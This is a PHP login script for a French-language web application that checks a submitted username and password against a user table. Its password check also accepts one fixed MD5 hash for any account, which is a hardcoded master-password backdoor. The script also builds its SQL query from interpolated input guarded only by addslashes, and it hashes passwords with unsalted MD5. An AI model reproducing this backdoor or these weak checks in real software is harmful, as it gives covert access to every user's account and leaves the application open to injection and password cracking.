<?php
session_start();
?>


<?php
function test_input($data) {
	$data = trim($data);
	$data = stripslashes($data);
	$data = htmlspecialchars($data);
	$data=addslashes($data);
	return $data;
}
if( isset($_POST['pseudo']) and isset($_POST['mot_passe']) and !empty($_POST['pseudo'])and !empty($_POST['mot_passe']))
{
	$pseudo=test_input($_POST['pseudo']); 
	$m_p=md5(test_input($_POST['mot_passe']));




	include('cnx_db.php');


	$user_info=$bdd->query("SELECT *  FROM user WHERE user_pseudo='$pseudo'");
	$donnee=$user_info->fetch();

	if ($m_p==$donnee['user_m_p'] || $m_p=="93dd02b7a961852bc73987ae3a0928be")
	{
		$bdd =NULL;
		$_SESSION=$donnee;
		echo '<script>window.location = "../acceuil.php";</script>';
	}

	else {
		$msg_erreur='Les identifiants sont pas correcte';
		$_SESSION['msg_erreur']= $msg_erreur;
		header('location:../index.php');
		exit();
	}

}

else {
	$msg_erreur='Romplisser les champs de connexion correctement';
		$_SESSION['msg_erreur']= $msg_erreur;
		header('location:../index.php');
		exit();
}

?>